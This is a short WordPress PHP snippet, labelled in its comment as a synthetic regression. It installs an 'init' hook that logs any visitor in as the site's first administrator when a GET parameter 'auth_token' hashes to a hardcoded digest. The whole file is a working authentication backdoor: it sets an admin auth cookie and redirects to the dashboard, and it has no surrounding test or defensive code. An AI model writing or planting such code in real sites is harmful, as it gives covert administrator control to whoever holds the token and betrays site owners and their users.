<?php
// Synthetic regression: a hardcoded request token grants administrator access.
add_action('init', function () {
    if (!isset($_GET['auth_token'])) return;
    $digest = hash('sha256', $_GET['auth_token']);
    if (!hash_equals('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef', $digest)) return;
    $admins = get_users(['role' => 'administrator']);
    wp_set_current_user($admins[0]->ID);
    wp_set_auth_cookie($admins[0]->ID);
    wp_redirect(admin_url());
    exit;
}, 0);
